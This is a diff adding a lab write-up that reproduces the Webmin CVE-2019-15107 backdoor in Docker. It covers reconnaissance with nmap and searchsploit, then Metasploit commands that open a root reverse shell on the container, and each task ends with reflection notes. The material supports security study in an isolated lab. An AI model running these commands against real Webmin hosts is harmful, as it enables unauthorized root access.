@@ -1,0 +1,234 @@
+PR: <link>
+
+=== TASKS ===
+
+= TASK 0 =
+mkdir -p orion-system/offensive-security
+cd orion-system/offensive-security
+cat docker-compose.yml
+services:
+  metasploit:
+    image: metasploitframework/metasploit-framework
+    container_name: metasploit
+    stdin_open: true
+    tty: true
+
+docker compose up -d
+docker ps
+CONTAINER ID   IMAGE                                      COMMAND                  CREATED         STATUS         PORTS     NAMES
+9efda6537521   metasploitframework/metasploit-framework   "docker/entrypoint.s…"   4 seconds ago   Up 3 seconds             metasploit
+
+# reflection
+- defined: metasploit container based on metasploitframework/metasploit-framework image
+- metasploit runs in docker to avoid installing deps on host, keep it isolated, and remove it after the lab
+- stdin_open and tty enable interactive terminal access needed for msfconsole
+- msf6 > indicates metasploit framework v6 is running and ready for commands
+
+= TASK 1 =
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/webmin/CVE-2019-15107
+cat docker-compose.yml
+version: '2'
+services:
+ web:
+   image: vulhub/webmin:1.910
+   ports:
+    - "10000:10000"
+
+docker compose up -d
+docker ps
+CONTAINER ID   IMAGE                  COMMAND                  CREATED         STATUS        PORTS                      NAMES
+df143b1d3190   vulhub/webmin:1.910    "/docker-entrypoint.…"   16 seconds ago  Up 7 seconds  0.0.0.0:10000->10000/tcp   cve-2019-15107-web-1
+
+curl -k https://localhost:10000
+<!DOCTYPE HTML>
+<html data-background-style="gainsboro" class="session_login">
+...
+<title>Login to Webmin</title>
+...
+
+# reflection
+- vulhub is a collection of intentionally vulnerable docker environments for security research
+- intentionally vulnerable envs allow safe reproduction of CVEs without risking production systems
+- webmin exposes TCP port 10000
+- browser shows certificate warning because webmin uses a self-signed certificate
+- isolated envs prevent accidental damage and keep offensive testing legal and controlled
+
+= TASK 2 =
+nmap --version
+Nmap version 7.99 ( https://nmap.org )
+Platform: arm-apple-darwin25.3.0
+
+nmap localhost
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 12:04 +0200
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000038s latency).
+Not shown: 995 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+5000/tcp  open  upnp
+7000/tcp  open  afs3-fileserver
+10000/tcp open  snet-sensor-mgmt
+49159/tcp open  unknown
+
+nmap localhost -p 10000
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 12:04 +0200
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00012s latency).
+PORT      STATE SERVICE
+10000/tcp open  snet-sensor-mgmt
+
+nmap -sV localhost -p 10000
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 12:04 +0200
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000064s latency).
+PORT      STATE SERVICE VERSION
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+
+= TASK 3 =
+searchsploit webmin
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Webmin - Brute Force / Command Execution      | multiple/remote/705.pl
+webmin 0.91 - Directory Traversal             | cgi/remote/21183.txt
+Webmin 1.580 - '/file/show.cgi' Remote Comma  | unix/remote/21851.rb
+Webmin 1.850 - Multiple Vulnerabilities       | cgi/webapps/42989.txt
+Webmin 1.900 - Remote Command Execution (Meta | cgi/remote/46201.rb
+Webmin 1.910 - 'Package Updates' Remote Comma | linux/remote/46984.rb
+Webmin 1.920 - Remote Code Execution          | linux/webapps/47293.sh
+Webmin 1.920 - Unauthenticated Remote Code Ex | linux/remote/47230.rb
+Webmin 1.962 - 'Package Updates' Escape Bypas | linux/webapps/49318.rb
+...
+
+searchsploit "webmin 1.910"
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Webmin 1.910 - 'Package Updates' Remote Comma | linux/remote/46984.rb
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execut | linux/webapps/47330.rb
+---------------------------------------------- ---------------------------------
+
+searchsploit --cve 2019-15107
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Webmin 1.920 - Remote Code Execution          | linux/webapps/47293.sh
+Webmin 1.920 - Unauthenticated Remote Code Ex | linux/remote/47230.rb
+---------------------------------------------- ---------------------------------
+
+searchsploit -p 47230
+  Exploit: Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/47230
+     Path: /opt/exploitdb/exploits/linux/remote/47230.rb
+    Codes: CVE-2019-15107
+ Verified: True
+File Type: Ruby script text, Unicode text, UTF-8 text
+
+# reflection
+- version info is valuable because it maps directly to known CVEs and available exploits
+- public exploit databases reduce attacker effort - no need to develop exploits from scratch
+- a public exploit doesn't guarantee success - env config, patching, and mitigations matter
+- attackers reuse exploits to save time and avoid detection from unusual activity patterns
+- before exploiting: verify exact version, confirm the vuln condition is enabled, check firewall
+
+= TASK 4 (understanding reverse shells) =
+# inside metasploit container
+use exploit/linux/http/webmin_backdoor
+info
+
+Name: Webmin password_change.cgi Backdoor
+Module: exploit/linux/http/webmin_backdoor
+Platform: Unix, Linux
+Arch: cmd, x86, x64
+Privileged: Yes
+License: Metasploit Framework License (BSD)
+Rank: Excellent
+Disclosed: 2019-08-10
+
+Description:
+  This module exploits a backdoor in Webmin versions 1.890 through 1.920.
+  CVE-2019-15107
+
+show options
+
+Module options (exploit/linux/http/webmin_backdoor):
+   Name       Current Setting  Required  Description
+   RHOSTS                      yes       The target host(s)
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS
+
+Payload options (cmd/unix/reverse_perl):
+   Name   Current Setting  Required  Description
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+# reflection
+- CVE-2019-15107 is exploited via password_change.cgi backdoor
+- affected versions: 1.890 through 1.920
+- default payload: cmd/unix/reverse_perl
+- reverse shell uses TCP port 4444
+- LHOST must be the attacker IP reachable by the victim
+
+= TASK 5 =
+# identify webmin container IP
+docker inspect cve-2019-15107-web-1 | grep '"IPAddress"'
+            "IPAddress": "",
+                    "IPAddress": "172.20.0.2",
+
+# connect metasploit to webmin network
+docker network connect cve-2019-15107_default metasploit
+
+# identify docker gateway (LHOST = metasploit IP on shared network)
+docker inspect metasploit | grep '"IPAddress"'
+            "IPAddress": "",
+                    "IPAddress": "172.20.0.3",
+                    "IPAddress": "172.19.0.2",
+
+# inside metasploit container - configure and run exploit
+use exploit/linux/http/webmin_backdoor
+set RHOSTS 172.20.0.2
+set RPORT 10000
+set SSL true
+set AutoCheck false
+set LHOST 172.20.0.3
+set LPORT 4444
+exploit -j
+sleep 20
+sessions -l
+
+[*] Started reverse TCP handler on 172.20.0.3:4444
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[-] Exploit failed: Errno::ENOTCONN Socket not connected - getpeername(2)
+[*] Command shell session 1 opened (172.20.0.3:4444 -> 172.20.0.2:54020) at 2026-06-02 10:40:21 +0000
+
+Active sessions
+===============
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               172.20.0.3:4444 -> 172.20.0.2:54020 (172.20.0.2)
+
+sessions -c "whoami;hostname;id;pwd" -i -1
+
+[*] Running 'whoami;hostname;id;pwd' on shell session -1 (172.20.0.2)
+root
+df143b1d3190
+uid=0(root) gid=0(root) groups=0(root)
+/usr/share/webmin/acl
+
+# webmin logs showing exploit hits
+docker logs cve-2019-15107-web-1
+172.20.0.3 - - [02/Jun/2026:10:39:51 +0000] "POST /password_change.cgi HTTP/1.1" 200 48539
+172.20.0.3 - - [02/Jun/2026:10:40:15 +0000] "POST /password_change.cgi HTTP/1.1" 200 48539
+172.20.0.1 - - [02/Jun/2026:10:40:33 +0000] "POST /session_login.cgi HTTP/1.1" 401 4725
+
+# reflection
+- exploit module connects to webmin, triggers command injection via password_change.cgi
+- payload instructs victim to connect back to LHOST:LPORT with reverse shell
+- LHOST required because reverse shell is victim-initiated - victim must know attacker address
+- SSL enabled because webmin uses HTTPS on port 10000
+- evidence of success: "Command shell session 1 opened" + whoami returning root
+- account compromised: root (uid=0)
+- system compromised: webmin docker container (df143b1d3190)
+- administrative privileges obtained: yes
